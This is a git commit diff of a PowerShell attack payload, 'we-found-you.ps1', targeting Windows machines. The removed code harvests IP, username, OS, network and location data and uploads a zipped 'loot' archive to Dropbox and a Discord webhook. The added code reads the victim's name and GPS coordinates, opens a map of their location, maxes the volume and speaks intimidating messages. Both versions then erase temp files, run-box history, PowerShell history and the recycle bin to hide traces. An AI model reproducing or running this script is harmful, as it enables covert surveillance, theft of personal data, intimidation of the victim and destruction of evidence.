b16422b7cbe9ea979db823b6ef9c36353bc73644
HonoEagle <79271536+HonoEagle@users.noreply.github.com>
2023-03-22 20:10:17 +0100

    Update we-found-you.ps1

--- FoundYou/we-found-you.ps1
+++ FoundYou/we-found-you.ps1
@@ -1,169 +1,149 @@
-$publicIP = (Invoke-WebRequest -Uri "http://checkip.dyndns.org" -UseBasicParsing).Content.Split(":")[1].Trim().Split("<")[0]
-$username = $env:username
-$os = (Get-WmiObject -Class Win32_OperatingSystem).Name
-#$wifi = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $True}).Description
+<#
+.NOTES
+	The target's Location Services must be turned on or this payload will not work.
 
-$networkAdapter = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $True}
+.SYNOPSIS
+	This script will get the user's location and open a map of where they are in their browser and use Windows speech to declare you know where they are.  
 
-if ($networkAdapter.DHCPEnabled -eq $True) {
-    $ipType = "DHCP"
-} else {
-    $ipType = "Static"
-}
+.DESCRIPTION 
+	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with their Microsoft account.
+	The SSID and WiFi password of any current or previously connected to networks.
+	It determines the last day they changed their password and how many days ago.
+	Once the information is gathered, the script will pause until a mouse movement is detected.
+	Then the script uses Sapi speak to roast their set up and lack of security.
+#>
 
-$networkName = $networkAdapter.Description
-$ipAddress = $networkAdapter.IPAddress[0]
-$subnetMask = $networkAdapter.IPSubnet[0]
-$defaultGateway = $networkAdapter.DefaultIPGateway[0]
-$location = (Invoke-WebRequest -Uri "http://ipinfo.io/json").Content | ConvertFrom-Json
-
-
-
-#For powershell
-Write-Host "Network Adapter: $networkName"
-Write-Host "IP Type: $ipType"
-Write-Host "IP Address: $ipAddress"
-Write-Host "Subnet Mask: $subnetMask"
-Write-Host "Default Gateway: $defaultGateway"
-
-Write-Host "City: $($location.city)"
-Write-Host "Region: $($location.region)"
-Write-Host "Country: $($location.country)"
-Write-Host "Latitude: $($location.loc.Split(",")[0])"
-Write-Host "Longitude: $($location.loc.Split(",")[1])"
-
-
-# Write information to text file
-$text = "We know where you are $publicIP
-We know who you are $username
-We know on what you work $os
-
-                        ____________
-                      .~      ,   . ~.
-                     /                \
-                    /      /~\/~\   ,  \
-                   |   .   \    /   '   |
-                   |         \/         |
-          XX       |  /~~\        /~~\  |       XX
-        XX  X      | |  o  \    /  o  | |      X  XX
-      XX     X     |  \____/    \____/  |     X     XX
- XXXXX     XX      \         /\        ,/      XX     XXXXX
-X        XX%;;@      \      /  \     ,/      @%%;XX        X
-X       X  @%%;;@     |           '  |     @%%;;@  X       X
-X      X     @%%;;@   |. ` ; ; ; ;  ,|   @%%;;@     X      X
- X    X        @%%;;@                  @%%;;@        X    X
-  X   X          @%%;;@              @%%;;@          X   X
-   X  X            @%%;;@          @%%;;@            X  X
-    XX X             @%%;;@      @%%;;@             X XX
-      XXX              @%%;;@  @%%;;@              XXX
-                         @%%;;%%;;@
-                           @%%;;@
-                         @%%;;@..@@
-                          @@@  @@@
-
-
-
-"
-$text | Out-File -FilePath "C:\Users\$env:username\Desktop\pawned.txt" -Encoding UTF8
-
-# Open the text file
-Start-Process -FilePath "notepad.exe" -ArgumentList "C:\Users\$env:username\Desktop\pawned.txt"
-
-############################################################################################################################################################
-
-
-
-# MAKE LOOT FOLDER, FILE, and ZIP 
-
-$FolderName = "$env:USERNAME-Recon-$(get-date -f yyyy-MM-dd_hh-mm)"
-
-$FileName = "$FolderName.txt"
-
-$ZIP = "$FolderName.zip"
-
-New-Item -Path $env:tmp/$FolderName -ItemType Directory
-
-# OUTPUTS RESULTS TO LOOT FILE
-
-$output = @"
-
-##############################################################################################################################
-#                                 |  ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ ███████╗ █████╗  ██████╗ ██╗     ███████╗   #
-# Title     : We-Found-You        | ██╔═══██╗██║  ██║██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝   #
-# Target    : Windows 7,10,11     | ██║██╗██║███████║██║   ██║██╔██╗ ██║██║   ██║█████╗  ███████║██║  ███╗██║     █████╗     #
-# Mode      : Hidden              | ██║██║██║██╔══██║██║   ██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝     #
-#                                 | ╚█║████╔╝██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝███████╗██║  ██║╚██████╔╝███████╗███████╗   #
-# Category  : Recon               |  ╚╝╚═══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   #
-#                                 |  Verrou par verrou et l'un apres l'autre, c'est la cle du bon hacker.                    #
-#                                 |    On ne peut pas ouvrir la porte numero 9 avant d'avoir debloque la numero 8.           #
-#_________________________________|                                                                                          #
-#                                                                                                                            #
-#                                                                                                                            #
-##############################################################################################################################
-
-
-$text
-
-"@
-
-$output > $env:TEMP\$FolderName/computerData.txt
-
-Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
-
-# Upload output file to dropbox
-
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
-
-############################################################################################################################################################
-
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "$dc"
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
-
- 
-
-############################################################################################################################################################
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 <#
+
+.NOTES 
+	This is to get the name associated with the targets Microsoft account, if not detected UserName will be used. 
+#>
+
+function Get-fullName {
+
+    try {
+
+    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+
+    }
+ 
+ # If no name is detected function will return $env:UserName 
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
+
+    return $fullName 
+
+}
+
+$FN = Get-fullName
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to get the current Latitude and Longitude of your target
+#>
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+		
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$GL = Get-GeoLocation
+
+$GL = $GL -split " "
+
+$Lat = $GL[0].Substring(11) -replace ".$"
+
+$Lon = $GL[1].Substring(10) -replace ".$"
+
+Pause-Script
+
+# Opens their browser with a map of their current location
+
+Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
+
+Start-Sleep -s 3
+
+# Sets Volume to max level
+
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+# Sets up speech module 
+
+$s=New-Object -ComObject SAPI.SpVoice
+$s.Rate = -2
+$s.Speak("We found you $FN")
+$s.Speak("We know where you are")
+$s.Speak("We are everywhere")
+$s.Speak("We do not forgive, we do not forget")
+$s.Speak("Expect us")
+
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
 
 # Delete contents of Temp folder 
 
-Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
@@ -176,10 +156,3 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-		
-############################################################################################################################################################
-
-# Popup message to signal the payload is done
-
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
